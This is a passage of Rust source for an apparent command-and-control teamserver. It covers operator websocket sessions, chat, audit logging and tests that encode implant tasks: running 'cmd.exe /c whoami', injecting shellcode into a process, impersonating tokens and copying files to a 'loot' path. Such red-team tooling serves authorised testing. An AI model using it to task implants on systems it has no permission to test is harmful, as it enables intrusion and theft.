    value.trim().parse::<u32>().map_err(|_| AgentCommandError::InvalidNumericField {
        field: field.to_owned(),
        value: value.to_owned(),
    })
}

fn parse_hex_u32(value: &str) -> Result<u32, AgentCommandError> {
    let trimmed = value.trim();
    let trimmed =
        trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")).unwrap_or(trimmed);
    u32::from_str_radix(trimmed, 16).map_err(|_| AgentCommandError::InvalidNumericField {
        field: "hex".to_owned(),
        value: value.to_owned(),
    })
}

fn ipv4_to_u32(value: &str) -> Result<u32, AgentCommandError> {
    let address = value.trim().parse::<std::net::Ipv4Addr>().map_err(|_| {
        AgentCommandError::InvalidNumericField { field: "ip".to_owned(), value: value.to_owned() }
    })?;
    Ok(u32::from_le_bytes(address.octets()))
}

fn write_u32(buf: &mut Vec<u8>, value: u32) {
    buf.extend_from_slice(&value.to_le_bytes());
}

fn write_u64(buf: &mut Vec<u8>, value: u64) {
    buf.extend_from_slice(&value.to_le_bytes());
}

fn write_len_prefixed_bytes(buf: &mut Vec<u8>, value: &[u8]) -> Result<(), crate::TeamserverError> {
    let len = u32::try_from(value.len())
        .map_err(|_| crate::TeamserverError::PayloadTooLarge { length: value.len() })?;
    write_u32(buf, len);
    buf.extend_from_slice(value);
    Ok(())
}

fn upload_remote_path(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<String, AgentCommandError> {
    let args = required_string(info, &["Arguments"], "Arguments")?;
    let remote =
        args.split(';').next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
    let remote = decode_base64_field("Arguments[0]", remote)?;
    Ok(String::from_utf8_lossy(&remote).into_owned())
}

fn upload_content(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let args = required_string(info, &["Arguments"], "Arguments")?;
    let mut parts = args.splitn(2, ';');
    let _remote = parts.next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
    let content = parts.next().ok_or(AgentCommandError::MissingField { field: "Arguments" })?;
    decode_base64_field("Arguments[1]", content)
}

fn random_u32() -> u32 {
    let bytes = *Uuid::new_v4().as_bytes();
    u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
}

fn encode_utf16(value: &str) -> Vec<u8> {
    let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
    encoded.extend_from_slice(&[0, 0]);
    encoded
}

fn teamserver_log_event(user: &str, text: &str) -> OperatorMessage {
    OperatorMessage::TeamserverLog(Message {
        head: MessageHead {
            event: EventCode::Teamserver,
            user: user.to_owned(),
            timestamp: OffsetDateTime::now_utc().unix_timestamp().to_string(),
            one_time: String::new(),
        },
        info: TeamserverLogInfo { text: text.to_owned() },
    })
}

fn build_payload_message_event(user: &str, level: &str, text: &str) -> OperatorMessage {
    OperatorMessage::BuildPayloadMessage(Message {
        head: MessageHead {
            event: EventCode::Gate,
            user: user.to_owned(),
            timestamp: OffsetDateTime::now_utc().unix_timestamp().to_string(),
            one_time: String::new(),
        },
        info: BuildPayloadMessageInfo { message_type: level.to_owned(), message: text.to_owned() },
    })
}

fn build_payload_response_event(
    user: &str,
    file_name: &str,
    format: &str,
    bytes: &[u8],
) -> OperatorMessage {
    OperatorMessage::BuildPayloadResponse(Message {
        head: MessageHead {
            event: EventCode::Gate,
            user: user.to_owned(),
            timestamp: OffsetDateTime::now_utc().unix_timestamp().to_string(),
            one_time: String::new(),
        },
        info: BuildPayloadResponseInfo {
            payload_array: BASE64_STANDARD.encode(bytes),
            format: format.to_owned(),
            file_name: file_name.to_owned(),
        },
    })
}

#[derive(Debug, Error)]
enum SnapshotSyncError {
    #[error(transparent)]
    Send(#[from] SendMessageError),
    #[error(transparent)]
    Serialize(#[from] serde_json::Error),
    #[error(transparent)]
    Listener(#[from] crate::ListenerManagerError),
    #[error(transparent)]
    Teamserver(#[from] crate::TeamserverError),
}

async fn send_session_snapshot(
    socket: &mut WebSocket,
    auth: &AuthService,
    events: &EventBus,
    listeners: &ListenerManager,
    registry: &AgentRegistry,
) -> Result<(), SnapshotSyncError> {
    let operators =
        auth.operator_inventory().await.into_iter().map(|entry| entry.as_operator_info()).collect();
    send_operator_message(socket, &operator_snapshot_event(operators)?).await?;

    for summary in listeners.list().await?.into_iter() {
        send_operator_message(
            socket,
            &listener_event_for_action("teamserver", &summary, ListenerEventAction::Created),
        )
        .await?;
    }

    for message in events.recent_teamserver_logs() {
        send_operator_message(socket, &message).await?;
    }

    for agent in registry.list_active().await {
        let pivots = registry.pivots(agent.agent_id).await;
        let listener_name =
            registry.listener_name(agent.agent_id).await.unwrap_or_else(|| "null".to_owned());
        send_operator_message(socket, &agent_snapshot_event(&listener_name, &agent, &pivots))
            .await?;
    }

    Ok(())
}

fn agent_snapshot_event(
    listener_name: &str,
    agent: &AgentInfo,
    pivots: &crate::PivotInfo,
) -> OperatorMessage {
    agent_new_event(listener_name, red_cell_common::demon::DEMON_MAGIC_VALUE, agent, pivots)
}

fn operator_snapshot_event(
    operators: Vec<OperatorInfo>,
) -> Result<OperatorMessage, serde_json::Error> {
    Ok(OperatorMessage::InitConnectionInfo(Message {
        head: MessageHead {
            event: EventCode::InitConnection,
            user: String::new(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: FlatInfo {
            fields: BTreeMap::from([("Operators".to_owned(), serde_json::to_value(operators)?)]),
        },
    }))
}

async fn cleanup_connection(
    auth: &AuthService,
    connections: &OperatorConnectionManager,
    events: &EventBus,
    database: &Database,
    webhooks: &AuditWebhookNotifier,
    connection_id: Uuid,
) {
    if let Some(session) = auth.remove_connection(connection_id).await {
        log_operator_action(
            database,
            webhooks,
            &session.username,
            "operator.disconnect",
            "operator",
            Some(session.username.clone()),
            audit_details(
                AuditResultStatus::Success,
                None,
                Some("disconnect"),
                Some(parameter_object([(
                    "connection_id",
                    Value::String(connection_id.to_string()),
                )])),
            ),
        )
        .await;

        if last_online_session(auth, &session.username).await {
            events.broadcast(chat_presence_event(&session.username, false));
        }
    }
    connections.unregister(connection_id).await;
}

async fn first_online_session(auth: &AuthService, username: &str) -> bool {
    auth.active_sessions().await.into_iter().filter(|session| session.username == username).count()
        == 1
}

async fn last_online_session(auth: &AuthService, username: &str) -> bool {
    auth.active_sessions().await.into_iter().all(|session| session.username != username)
}

fn chat_presence_event(user: &str, online: bool) -> OperatorMessage {
    let message = Message {
        head: MessageHead {
            event: EventCode::Chat,
            user: "teamserver".to_owned(),
            timestamp: OffsetDateTime::now_utc().unix_timestamp().to_string(),
            one_time: String::new(),
        },
        info: red_cell_common::operator::ChatUserInfo { user: user.to_owned() },
    };

    if online {
        OperatorMessage::ChatUserConnected(message)
    } else {
        OperatorMessage::ChatUserDisconnected(message)
    }
}

fn chat_message_event(user: &str, text: &str) -> OperatorMessage {
    OperatorMessage::ChatMessage(Message {
        head: MessageHead {
            event: EventCode::Chat,
            user: user.to_owned(),
            timestamp: OffsetDateTime::now_utc().unix_timestamp().to_string(),
            one_time: String::new(),
        },
        info: FlatInfo {
            fields: BTreeMap::from([
                ("User".to_owned(), Value::String(user.to_owned())),
                ("Message".to_owned(), Value::String(text.to_owned())),
            ]),
        },
    })
}

async fn log_operator_action(
    database: &Database,
    webhooks: &AuditWebhookNotifier,
    actor: &str,
    action: &str,
    target_kind: &str,
    target_id: Option<String>,
    details: crate::AuditDetails,
) {
    if let Err(error) = record_operator_action_with_notifications(
        database,
        webhooks,
        actor,
        action,
        target_kind,
        target_id,
        details,
    )
    .await
    {
        warn!(actor, action, %error, "failed to persist audit log entry");
    }
}

async fn send_operator_message(
    socket: &mut WebSocket,
    message: &OperatorMessage,
) -> Result<(), SendMessageError> {
    let payload = serde_json::to_string(message)?;
    socket.send(WsMessage::Text(payload.into())).await?;
    Ok(())
}

async fn send_login_error(
    socket: &mut WebSocket,
    user: &str,
    failure: AuthenticationFailure,
    connection_id: Uuid,
) {
    if let Err(error) = send_operator_message(socket, &login_failure_message(user, &failure)).await
    {
        warn!(%connection_id, %error, "failed to send operator websocket authentication error");
    }

    let _ = socket.send(WsMessage::Close(None)).await;
}

enum SocketLoopControl {
    Continue,
    Break,
}

#[derive(Debug, Error)]
enum SendMessageError {
    #[error("failed to serialize operator message: {0}")]
    Serialize(#[from] serde_json::Error),
    #[error("failed to send operator websocket message: {0}")]
    Socket(#[from] axum::Error),
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::time::{Duration, Instant};

    use axum::extract::FromRef;
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use futures_util::{SinkExt, StreamExt};
    use red_cell_common::{
        AgentEncryptionInfo, OperatorInfo,
        config::Profile,
        demon::{
            DemonCommand, DemonFilesystemCommand, DemonInjectWay, DemonProcessCommand,
            DemonTokenCommand,
        },
        operator::{
            AgentTaskInfo, EventCode, FlatInfo, ListenerInfo, ListenerMarkInfo, LoginInfo, Message,
            MessageHead, NameInfo, OperatorMessage, SessionCode, TeamserverLogInfo,
        },
    };
    use serde_json::Value;
    use tokio::net::TcpListener;
    use tokio::time::timeout;
    use tokio_tungstenite::{connect_async, tungstenite::Message as ClientMessage};
    use uuid::Uuid;

    use std::net::IpAddr;

    use super::{
        AgentCommandError, DEMON_MAX_RESPONSE_LENGTH, LoginRateLimiter, OperatorConnectionManager,
        build_job, build_jobs, encode_utf16, routes, teamserver_log_event,
        write_len_prefixed_bytes, write_u32,
    };
    use crate::{
        AgentRegistry, AuditQuery, AuditResultStatus, AuditWebhookNotifier, AuthService, Database,
        EventBus, ListenerManager, PayloadBuilderService, SocketRelayManager, query_audit_log,
    };
    use red_cell_common::crypto::hash_password_sha3;

    #[derive(Clone)]
    struct TestState {
        auth: AuthService,
        database: Database,
        events: EventBus,
        connections: OperatorConnectionManager,
        registry: AgentRegistry,
        listeners: ListenerManager,
        payload_builder: PayloadBuilderService,
        sockets: SocketRelayManager,
        webhooks: AuditWebhookNotifier,
        login_rate_limiter: LoginRateLimiter,
    }

    impl TestState {
        async fn new() -> Self {
            let profile = Profile::parse(
                r#"
                Teamserver {
                  Host = "127.0.0.1"
                  Port = 40056
                }

                Operators {
                  user "operator" {
                    Password = "password1234"
                    Role = "Operator"
                  }
                  user "analyst" {
                    Password = "readonly"
                    Role = "Analyst"
                  }
                  user "admin" {
                    Password = "adminpass"
                    Role = "Admin"
                  }
                }

                Demon {}
                "#,
            )
            .expect("test profile should parse");

            let database = Database::connect_in_memory().await.expect("database should initialize");
            let registry = AgentRegistry::new(database.clone());
            let events = EventBus::default();
            let sockets = SocketRelayManager::new(registry.clone(), events.clone());

            Self {
                auth: AuthService::from_profile(&profile),
                database: database.clone(),
                events: events.clone(),
                connections: OperatorConnectionManager::new(),
                registry: registry.clone(),
                listeners: ListenerManager::new(database, registry, events, sockets.clone(), None),
                payload_builder: PayloadBuilderService::disabled_for_tests(),
                sockets,
                webhooks: AuditWebhookNotifier::from_profile(&profile),
                login_rate_limiter: LoginRateLimiter::new(),
            }
        }
    }

    impl FromRef<TestState> for AuthService {
        fn from_ref(input: &TestState) -> Self {
            input.auth.clone()
        }
    }

    impl FromRef<TestState> for Database {
        fn from_ref(input: &TestState) -> Self {
            input.database.clone()
        }
    }

    impl FromRef<TestState> for EventBus {
        fn from_ref(input: &TestState) -> Self {
            input.events.clone()
        }
    }

    impl FromRef<TestState> for OperatorConnectionManager {
        fn from_ref(input: &TestState) -> Self {
            input.connections.clone()
        }
    }

    impl FromRef<TestState> for AgentRegistry {
        fn from_ref(input: &TestState) -> Self {
            input.registry.clone()
        }
    }

    impl FromRef<TestState> for ListenerManager {
        fn from_ref(input: &TestState) -> Self {
            input.listeners.clone()
        }
    }

    impl FromRef<TestState> for SocketRelayManager {
        fn from_ref(input: &TestState) -> Self {
            input.sockets.clone()
        }
    }

    impl FromRef<TestState> for PayloadBuilderService {
        fn from_ref(input: &TestState) -> Self {
            input.payload_builder.clone()
        }
    }

    impl FromRef<TestState> for AuditWebhookNotifier {
        fn from_ref(input: &TestState) -> Self {
            input.webhooks.clone()
        }
    }

    impl FromRef<TestState> for LoginRateLimiter {
        fn from_ref(input: &TestState) -> Self {
            input.login_rate_limiter.clone()
        }
    }

    #[tokio::test]
    async fn connection_manager_tracks_registered_and_authenticated_clients() {
        let manager = OperatorConnectionManager::new();
        let first = Uuid::new_v4();
        let second = Uuid::new_v4();

        manager.register(first).await;
        manager.register(second).await;
        manager.authenticate(first, "operator".to_owned()).await;

        assert_eq!(manager.connection_count().await, 2);
        assert_eq!(manager.authenticated_count().await, 1);

        manager.unregister(first).await;
        manager.unregister(second).await;

        assert_eq!(manager.connection_count().await, 0);
        assert_eq!(manager.authenticated_count().await, 0);
    }

    #[tokio::test]
    async fn websocket_requires_login_before_other_messages() {
        let state = TestState::new().await;
        let connection_registry = state.connections.clone();
        let (mut socket, server) = spawn_server(state).await;

        let non_login = serde_json::to_string(&OperatorMessage::TeamserverLog(Message {
            head: MessageHead {
                event: EventCode::Teamserver,
                user: "operator".to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: TeamserverLogInfo { text: "hello".to_owned() },
        }))
        .expect("message should serialize");

        socket.send(ClientMessage::Text(non_login.into())).await.expect("message should send");

        let response = read_operator_message(&mut socket).await;
        assert!(matches!(response, OperatorMessage::InitConnectionError(_)));

        wait_for_connection_count(&connection_registry, 0).await;
        server.abort();
    }

    #[tokio::test]
    async fn websocket_closes_idle_unauthenticated_connections() {
        let state = TestState::new().await;
        let connection_registry = state.connections.clone();
        let (mut socket, server) = spawn_server(state).await;

        let frame =
            timeout(super::AUTHENTICATION_FRAME_TIMEOUT + Duration::from_secs(2), socket.next())
                .await
                .expect("socket should close idle unauthenticated connection")
                .expect("close frame should be present")
                .expect("close frame should decode");
        assert!(matches!(frame, ClientMessage::Close(_)));

        wait_for_connection_count(&connection_registry, 0).await;
        assert_eq!(connection_registry.authenticated_count().await, 0);
        server.abort();
    }

    #[tokio::test]
    async fn websocket_forwards_event_bus_messages_after_login() {
        let state = TestState::new().await;
        let event_bus = state.events.clone();
        let connection_registry = state.connections.clone();
        let auth = state.auth.clone();
        let (mut socket, server) = spawn_server(state).await;

        socket
            .send(ClientMessage::Text(login_message("operator", "password1234").into()))
            .await
            .expect("login should send");

        let response = read_operator_message(&mut socket).await;
        assert!(matches!(response, OperatorMessage::InitConnectionSuccess(_)));
        let _snapshot = read_operator_snapshot(&mut socket).await;
        assert_eq!(connection_registry.connection_count().await, 1);
        assert_eq!(connection_registry.authenticated_count().await, 1);
        assert_eq!(auth.session_count().await, 1);

        let event = OperatorMessage::TeamserverLog(Message {
            head: MessageHead {
                event: EventCode::Teamserver,
                user: "teamserver".to_owned(),
                timestamp: "12:34:56".to_owned(),
                one_time: String::new(),
            },
            info: TeamserverLogInfo { text: "broadcast".to_owned() },
        });

        tokio::time::sleep(Duration::from_millis(50)).await;
        assert_eq!(event_bus.broadcast(event.clone()), 1);
        assert_eq!(read_operator_message(&mut socket).await, event);

        socket.close(None).await.expect("close should send");
        wait_for_connection_count(&connection_registry, 0).await;
        assert_eq!(auth.session_count().await, 0);
        server.abort();
    }

    #[tokio::test]
    async fn websocket_broadcasts_operator_presence_changes() {
        let state = TestState::new().await;
        let (mut first, server) = spawn_server(state.clone()).await;
        let (mut second, _) = spawn_server(state).await;

        login(&mut first, "operator", "password1234").await;
        login(&mut second, "analyst", "readonly").await;

        let joined = read_operator_message(&mut first).await;
        let OperatorMessage::ChatUserConnected(message) = joined else {
            panic!("expected operator join broadcast");
        };
        assert_eq!(message.info.user, "analyst");

        second.close(None).await.expect("close should send");

        let left = read_operator_message(&mut first).await;
        let OperatorMessage::ChatUserDisconnected(message) = left else {
            panic!("expected operator disconnect broadcast");
        };
        assert_eq!(message.info.user, "analyst");

        first.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_broadcasts_chat_messages_to_other_operators() {
        let state = TestState::new().await;
        let (mut sender, server) = spawn_server(state.clone()).await;
        let (mut observer, _) = spawn_server(state).await;

        login(&mut sender, "operator", "password1234").await;
        login(&mut observer, "analyst", "readonly").await;
        let _presence = read_operator_message(&mut sender).await;

        sender
            .send(ClientMessage::Text(chat_message("operator", "hello team").into()))
            .await
            .expect("chat should send");

        let message = read_operator_message(&mut observer).await;
        let OperatorMessage::ChatMessage(message) = message else {
            panic!("expected chat broadcast");
        };
        assert_eq!(message.head.user, "operator");
        assert_eq!(message.info.fields.get("User"), Some(&Value::String("operator".to_owned())));
        assert_eq!(
            message.info.fields.get("Message"),
            Some(&Value::String("hello team".to_owned()))
        );

        sender.close(None).await.expect("close should send");
        observer.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_chat_messages_are_persisted_as_session_activity() {
        let state = TestState::new().await;
        let (mut sender, server) = spawn_server(state.clone()).await;

        login(&mut sender, "operator", "password1234").await;
        sender
            .send(ClientMessage::Text(chat_message("operator", "hello team").into()))
            .await
            .expect("chat should send");
        let _broadcast = read_operator_message(&mut sender).await;

        let page = query_audit_log(
            &state.database,
            &AuditQuery {
                action: Some("operator.chat".to_owned()),
                actor: Some("operator".to_owned()),
                ..AuditQuery::default()
            },
        )
        .await
        .expect("audit query should succeed");

        assert_eq!(page.total, 1);
        assert_eq!(page.items[0].action, "operator.chat");
        assert_eq!(
            page.items[0]
                .parameters
                .as_ref()
                .and_then(|parameters| parameters.get("message"))
                .and_then(Value::as_str),
            Some("hello team")
        );

        sender.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_sends_session_snapshot_after_login() {
        let state = TestState::new().await;
        let registry = state.registry.clone();
        let listeners = state.listeners.clone();
        let events = state.events.clone();
        registry
            .insert_with_listener(sample_agent(0xDEAD_BEEF), "alpha")
            .await
            .expect("agent should insert");
        listeners.create(sample_http_listener("alpha", 0)).await.expect("listener should persist");
        listeners.start("alpha").await.expect("listener should start");
        let expected_log = teamserver_log_event("teamserver", "snapshot entry");
        assert_eq!(events.broadcast(expected_log.clone()), 0);
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        let listener_event = read_operator_message(&mut socket).await;
        let OperatorMessage::ListenerNew(message) = listener_event else {
            panic!("expected listener snapshot event");
        };
        assert_eq!(message.info.name.as_deref(), Some("alpha"));
        assert_eq!(message.info.status.as_deref(), Some("Online"));

        assert_eq!(read_operator_message(&mut socket).await, expected_log);

        let agent_event = read_operator_message(&mut socket).await;
        let OperatorMessage::AgentNew(message) = agent_event else {
            panic!("expected agent snapshot event");
        };
        assert_eq!(message.info.name_id, "DEADBEEF");
        assert_eq!(message.info.listener, "alpha");
        assert_eq!(message.info.magic_value, "deadbeef");
        let encoded = serde_json::to_value(&message.info).expect("agent snapshot should serialize");
        assert!(encoded.get("Encryption").is_none());

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_session_snapshot_includes_configured_and_runtime_operators() {
        let state = TestState::new().await;
        state
            .auth
            .create_operator("trinity", "zion", red_cell_common::config::OperatorRole::Operator)
            .await
            .expect("runtime operator should be created");
        let (mut socket, server) = spawn_server(state).await;

        socket
            .send(ClientMessage::Text(login_message("operator", "password1234").into()))
            .await
            .expect("login should send");
        let response = read_operator_message(&mut socket).await;
        assert!(matches!(response, OperatorMessage::InitConnectionSuccess(_)));

        let operators = read_operator_snapshot(&mut socket).await;
        assert_eq!(
            operators,
            vec![
                OperatorInfo {
                    username: "admin".to_owned(),
                    password_hash: None,
                    role: Some("Admin".to_owned()),
                    online: false,
                    last_seen: None,
                },
                OperatorInfo {
                    username: "analyst".to_owned(),
                    password_hash: None,
                    role: Some("Analyst".to_owned()),
                    online: false,
                    last_seen: None,
                },
                OperatorInfo {
                    username: "operator".to_owned(),
                    password_hash: None,
                    role: Some("Operator".to_owned()),
                    online: true,
                    last_seen: None,
                },
                OperatorInfo {
                    username: "trinity".to_owned(),
                    password_hash: None,
                    role: Some("Operator".to_owned()),
                    online: false,
                    last_seen: None,
                },
            ]
        );

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_session_snapshot_includes_agent_pivot_chain() {
        let state = TestState::new().await;
        let registry = state.registry.clone();
        registry.insert(sample_agent(0x0102_0304)).await.expect("parent should insert");
        registry.insert(sample_agent(0x1112_1314)).await.expect("child should insert");
        registry.add_link(0x0102_0304, 0x1112_1314).await.expect("pivot link should insert");
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        let parent_event = read_operator_message(&mut socket).await;
        let OperatorMessage::AgentNew(parent_message) = parent_event else {
            panic!("expected parent snapshot event");
        };
        assert_eq!(parent_message.info.name_id, "01020304");
        assert!(parent_message.info.pivots.parent.is_none());
        assert_eq!(parent_message.info.pivots.links, vec!["11121314".to_owned()]);

        let child_event = read_operator_message(&mut socket).await;
        let OperatorMessage::AgentNew(child_message) = child_event else {
            panic!("expected child snapshot event");
        };
        assert_eq!(child_message.info.name_id, "11121314");
        assert_eq!(child_message.info.pivots.parent.as_deref(), Some("01020304"));
        assert_eq!(child_message.info.pivot_parent, "01020304");

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_snapshot_includes_persisted_offline_listeners() {
        let state = TestState::new().await;
        let listeners = state.listeners.clone();
        listeners
            .create(sample_http_listener("offline-alpha", 0))
            .await
            .expect("listener should persist");
        let (mut socket, server) = spawn_server(state).await;

        login(&mut socket, "operator", "password1234").await;

        let listener_event = read_operator_message(&mut socket).await;
        let OperatorMessage::ListenerNew(message) = listener_event else {
            panic!("expected listener snapshot event");
        };
        assert_eq!(message.info.name.as_deref(), Some("offline-alpha"));
        assert_eq!(message.info.status.as_deref(), Some("Offline"));

        socket.close(None).await.expect("close should send");
        server.abort();
    }

    #[tokio::test]
    async fn websocket_closes_when_authenticated_operator_lacks_permission() {
        let state = TestState::new().await;
        let connection_registry = state.connections.clone();
        let (mut socket, server) = spawn_server(state).await;

        socket
            .send(ClientMessage::Text(login_message("analyst", "readonly").into()))
            .await
            .expect("login should send");
        let response = read_operator_message(&mut socket).await;
        assert!(matches!(response, OperatorMessage::InitConnectionSuccess(_)));
        let _snapshot = read_operator_snapshot(&mut socket).await;

        let task = serde_json::to_string(&OperatorMessage::AgentTask(Message {
            head: MessageHead {
                event: EventCode::Session,
                user: "analyst".to_owned(),
                timestamp: String::new(),
                one_time: String::new(),
            },
            info: AgentTaskInfo {
                task_id: "1".to_owned(),
                command_line: "shell whoami".to_owned(),
                demon_id: "deadbeef".to_owned(),
                command_id: SessionCode::AgentTask.as_u32().to_string(),
                agent_type: None,
                task_message: None,
                command: None,
                sub_command: None,
                arguments: None,
                extra: Default::default(),
            },
        }))
        .expect("task should serialize");

        socket.send(ClientMessage::Text(task.into())).await.expect("task should send");

        let close_frame = timeout(Duration::from_secs(2), socket.next())
            .await
            .expect("socket should close")
            .expect("close frame should be present")
            .expect("close frame should be valid");
        assert!(matches!(close_frame, ClientMessage::Close(_)));

        wait_for_connection_count(&connection_registry, 0).await;
        server.abort();
    }

    #[tokio::test]
    async fn websocket_agent_task_enqueues_job_and_broadcasts_event() {
        let state = TestState::new().await;
        let registry = state.registry.clone();
        registry.insert(sample_agent(0xDEAD_BEEF)).await.expect("agent should insert");
        let (mut sender, server) = spawn_server(state.clone()).await;
        let (mut observer, _) = spawn_server(state).await;

        login(&mut sender, "operator", "password1234").await;
        login(&mut observer, "operator", "password1234").await;
        let snapshot = read_operator_message(&mut sender).await;
        assert!(matches!(snapshot, OperatorMessage::AgentNew(_)));
        let snapshot = read_operator_message(&mut observer).await;
        assert!(matches!(snapshot, OperatorMessage::AgentNew(_)));

        sender
            .send(ClientMessage::Text(
                agent_task_message(
                    "operator",
                    AgentTaskInfo {
                        task_id: "2A".to_owned(),
                        command_line: "checkin".to_owned(),
                        demon_id: "DEADBEEF".to_owned(),
                        command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
                        ..AgentTaskInfo::default()
                    },
                )
                .into(),
            ))
            .await
            .expect("task should send");

        let event = read_operator_message(&mut observer).await;
        let OperatorMessage::AgentTask(message) = event else {
            panic!("expected agent task broadcast");
        };
        assert_eq!(message.head.user, "operator");
        assert_eq!(message.info.demon_id, "DEADBEEF");

        let queued = registry.queued_jobs(0xDEAD_BEEF).await.expect("queue should load");
        assert_eq!(queued.len(), 1);
        assert_eq!(queued[0].command, u32::from(DemonCommand::CommandCheckin));
        assert_eq!(queued[0].request_id, 0x2A);
        assert_eq!(queued[0].command_line, "checkin");

        sender.close(None).await.expect("close should send");
        observer.close(None).await.expect("close should send");
        server.abort();
    }

    #[test]
    fn build_job_encodes_process_list_payload() {
        let job = build_job(&AgentTaskInfo {
            task_id: "2A".to_owned(),
            command_line: "ps".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
            extra: BTreeMap::from([(String::from("FromProcessManager"), Value::Bool(true))]),
            ..AgentTaskInfo::default()
        })
        .expect("process list job should build");

        assert_eq!(job.command, u32::from(DemonCommand::CommandProcList));
        assert_eq!(job.payload, 1_u32.to_le_bytes());
    }

    #[test]
    fn build_job_encodes_process_create_payload() {
        let encoded_args = BASE64_STANDARD.encode("\"C:\\Windows\\System32\\cmd.exe\" /c whoami");
        let job = build_job(&AgentTaskInfo {
            task_id: "2B".to_owned(),
            command_line: "proc create normal cmd.exe /c whoami".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandProc).to_string(),
            sub_command: Some("create".to_owned()),
            extra: BTreeMap::from([(
                String::from("Args"),
                Value::String(format!(
                    "0;TRUE;FALSE;C:\\Windows\\System32\\cmd.exe;{encoded_args}"
                )),
            )]),
            ..AgentTaskInfo::default()
        })
        .expect("process create job should build");

        let mut offset = 0usize;
        assert_eq!(read_u32_le(&job.payload, &mut offset), u32::from(DemonProcessCommand::Create));
        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
        assert_eq!(
            decode_utf16(read_len_prefixed_bytes(&job.payload, &mut offset)),
            "C:\\Windows\\System32\\cmd.exe"
        );
        assert_eq!(
            decode_utf16(read_len_prefixed_bytes(&job.payload, &mut offset)),
            "\"C:\\Windows\\System32\\cmd.exe\" /c whoami"
        );
        assert_eq!(read_u32_le(&job.payload, &mut offset), 0);
        assert_eq!(read_u32_le(&job.payload, &mut offset), 1);
    }

    #[test]
    fn build_job_encodes_shellcode_inject_and_token_impersonation() {
        let shellcode = BASE64_STANDARD.encode([0x90_u8, 0x90, 0xCC]);
        let shellcode_job = build_job(&AgentTaskInfo {
            task_id: "2C".to_owned(),
            command_line: "shellcode inject x64 4444 /tmp/payload.bin".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
            extra: BTreeMap::from([
                (String::from("Way"), Value::String("Inject".to_owned())),
                (String::from("Technique"), Value::String("default".to_owned())),
                (String::from("Arch"), Value::String("x64".to_owned())),
                (String::from("Binary"), Value::String(shellcode)),
                (String::from("PID"), Value::String("4444".to_owned())),
            ]),
            ..AgentTaskInfo::default()
        })
        .expect("shellcode inject job should build");

        let mut offset = 0usize;
        assert_eq!(
            read_u32_le(&shellcode_job.payload, &mut offset),
            u32::from(DemonInjectWay::Inject)
        );
        assert_eq!(read_u32_le(&shellcode_job.payload, &mut offset), 0);
        assert_eq!(read_u32_le(&shellcode_job.payload, &mut offset), 1);
        assert_eq!(
            read_len_prefixed_bytes(&shellcode_job.payload, &mut offset),
            vec![0x90, 0x90, 0xCC]
        );
        assert_eq!(read_len_prefixed_bytes(&shellcode_job.payload, &mut offset), Vec::<u8>::new());
        assert_eq!(read_u32_le(&shellcode_job.payload, &mut offset), 4444);

        let token_job = build_job(&AgentTaskInfo {
            task_id: "2D".to_owned(),
            command_line: "token impersonate 7".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandToken).to_string(),
            sub_command: Some("impersonate".to_owned()),
            arguments: Some("7".to_owned()),
            ..AgentTaskInfo::default()
        })
        .expect("token impersonation job should build");
        assert_eq!(
            token_job.payload,
            [u32::from(DemonTokenCommand::Impersonate).to_le_bytes(), 7_u32.to_le_bytes()].concat()
        );
    }

    #[test]
    fn build_jobs_encodes_filesystem_copy_payload() -> Result<(), crate::TeamserverError> {
        let jobs = build_jobs(
            &AgentTaskInfo {
                task_id: "2E".to_owned(),
                command_line: "cp a b".to_owned(),
                demon_id: "DEADBEEF".to_owned(),
                command_id: u32::from(DemonCommand::CommandFs).to_string(),
                sub_command: Some("cp".to_owned()),
                arguments: Some(format!(
                    "{};{}",
                    BASE64_STANDARD.encode("C:\\temp\\a.txt"),
                    BASE64_STANDARD.encode("D:\\loot\\b.txt")
                )),
                ..AgentTaskInfo::default()
            },
            "",
        )
        .expect("filesystem copy should encode");

        assert_eq!(jobs.len(), 1);
        let mut expected = Vec::new();
        write_u32(&mut expected, u32::from(DemonFilesystemCommand::Copy));
        write_len_prefixed_bytes(&mut expected, &encode_utf16("C:\\temp\\a.txt"))?;
        write_len_prefixed_bytes(&mut expected, &encode_utf16("D:\\loot\\b.txt"))?;
        assert_eq!(jobs[0].command, u32::from(DemonCommand::CommandFs));
        assert_eq!(jobs[0].payload, expected);
        Ok(())
    }

    #[test]
    fn build_job_encodes_token_privs_list_payload_from_extra_subcommand_string() {
        let job = build_job(&AgentTaskInfo {
            task_id: "2F".to_owned(),
            command_line: "token privs-list".to_owned(),
            demon_id: "DEADBEEF".to_owned(),
            command_id: u32::from(DemonCommand::CommandToken).to_string(),
            extra: BTreeMap::from([(
                String::from("SubCommand"),
                Value::String("privs-list".to_owned()),
            )]),
